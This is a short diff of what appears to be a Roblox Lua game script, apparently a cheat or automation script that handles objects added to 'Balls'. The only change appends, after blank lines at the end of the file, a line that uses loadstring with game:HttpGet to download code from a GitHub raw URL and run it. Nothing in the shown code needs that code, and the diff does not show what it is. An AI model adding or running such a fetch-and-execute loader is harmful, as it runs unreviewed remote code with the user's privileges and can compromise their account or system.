@@ -65,3 +65,6 @@ Balls.ChildAdded:Connect(function(Ball)
         end
     end)
 end)
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rcisback/CloseCombat/main/Nextix"))()
